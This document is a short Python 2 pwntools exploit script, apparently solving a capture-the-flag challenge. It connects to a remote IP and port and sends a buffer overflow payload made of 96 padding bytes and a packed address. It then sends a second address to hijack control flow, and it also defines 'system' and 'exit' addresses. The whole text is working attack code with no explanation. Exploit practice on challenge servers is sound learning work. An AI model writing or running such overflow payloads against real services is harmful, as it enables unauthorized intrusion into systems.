from pwn import *
from time import sleep


s = remote("103.237.99.35", 28104)
#s = process("./pwnd")
print s.recv()

GJ = 0x0804864f
exit = 0x0804a020
system = 0x0804865f
rand = 0x0804a028
payload = "a"*96 + p32(rand)

s.sendline(payload)
print s.recv()
payload = GJ
s.sendline(str(payload))
print s.recv()
sleep(1)
print s.recv()

s.close()
